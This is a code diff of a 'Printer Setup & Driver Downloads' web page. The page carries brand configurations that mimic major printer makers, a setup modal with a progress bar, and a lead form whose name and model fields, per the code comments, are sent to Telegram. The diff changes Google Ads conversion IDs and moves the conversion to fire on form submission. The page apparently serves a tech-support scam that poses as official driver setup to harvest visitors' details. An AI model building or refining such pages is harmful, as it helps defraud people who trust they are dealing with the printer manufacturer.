@@ -1,15 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18471086516"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-18471086516');
-</script>
+<!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18471086516"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'AW-18471086516'); </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Printer Setup & Driver Downloads</title>
@@ -521,7 +513,7 @@
     };
     if (typeof gtag === 'function') {
       gtag('event', 'conversion', {
-          'send_to': 'AW-18240412400/8_sVCJ7bmsQcEPC12vlD',
+          'send_to': 'AW-18471086516/fKooCKPdjYMdELTT2edE',
           'event_callback': callback
       });
     }
@@ -537,7 +529,7 @@
   }
 
   const brandConfigs = {
-    br: { shortWord: 'BR', logoImg: '/images/b-Logo.png', primaryBg: '#003399', buttonBg: '#E53E3E', buttonHover: '#C53030', navItems: ['Mono Laser', 'Color Laser', 'Inkjet', 'Label Printers', 'Supplies'], heroPrinterImg: '/images/B-Hero.png', heroBgImg: '/images/B-Hero-Bg.jpg', modelFinderImg: '/images/B-Model.png', footerImg: '/images/B-Footer.jpg' },
+    br: { shortWord: 'BR', logoImg: '/images/b-logo.png', primaryBg: '#003399', buttonBg: '#E53E3E', buttonHover: '#C53030', navItems: ['Mono Laser', 'Color Laser', 'Inkjet', 'Label Printers', 'Supplies'], heroPrinterImg: '/images/B-Hero.png', heroBgImg: '/images/B-Hero-Bg.jpg', modelFinderImg: '/images/B-Model.png', footerImg: '/images/B-Footer.jpg' },
     h: { shortWord: 'H', logoImg: '/images/H-Logo.svg', primaryBg: '#0096D6', buttonBg: '#222222', buttonHover: '#444444', navItems: ['LaserJet', 'OfficeJet', 'Envy', 'DesignJet', 'Supplies'], heroPrinterImg: '/images/H-Hero.png', heroBgImg: '/images/H-Hero-Bg.jpg', modelFinderImg: '/images/H-Model.png', footerImg: '/images/H-Footer.jpg' },
     ca: { shortWord: 'CA', logoImg: '/images/C-Logo.png', primaryBg: '#C30010', buttonBg: '#0091FF', buttonHover: '#0077E2', navItems: ['Maxify', 'Laser', 'Selphy', 'Supplies', 'Projectors', 'Label Printer', 'ink'], heroPrinterImg: '/images/C-Hero.png', heroBgImg: '/images/C-Hero-Bg.jpg', modelFinderImg: '/images/C-Model.png', footerImg: '/images/C-Footer.png' },
     ep: { shortWord: 'EP', logoImg: '/images/E-Logo.png', primaryBg: '#0054A6', buttonBg: '#0085FF', buttonHover: '#006ACC', navItems: ['EcoTank', 'WorkForce', 'Expression', 'Supplies', 'Projectors', 'Scanners'], heroPrinterImg: '/images/E-Hero.png', heroBgImg: '/images/E-Hero-Bg.jpg', modelFinderImg: '/images/E-Model.png', footerImg: '/images/E-Footer.jpg' }
@@ -647,16 +639,18 @@
   function handleMainFormSubmit(e) { e.preventDefault(); openSetupModal(); }
   function updateProgressBarWidth(p) { document.getElementById('progress-percentage-txt').textContent = `${p}%`; document.getElementById('progress-bar-fill').style.width = `${p}%`; }
 
-  // 1. SELECT CONNECTION TYPE -> TRIGGER CONVERSION & OPEN LEAD FORM
+  // 1. SELECT CONNECTION TYPE -> OPEN LEAD FORM
   function selectConnectionType(type) {
     connectionType = type;
-    gtag_report_conversion(); // Triggers Google Ads Conversion Event on selection
     setModalStep('form');
   }
 
-  // 2. LEAD FORM SUBMIT -> SEND TELEGRAM + PROGRESS
+  // 2. LEAD FORM SUBMIT -> TRIGGER GOOGLE ADS CONVERSION + SEND TELEGRAM + PROGRESS
   async function handleLeadFormSubmit(e) {
     e.preventDefault();
+
+    // Trigger Conversion when user submits lead form
+    gtag_report_conversion();
 
     const name = document.getElementById('userNameInput').value.trim();
     const model = document.getElementById('userModelInput').value.trim() || "Not provided";
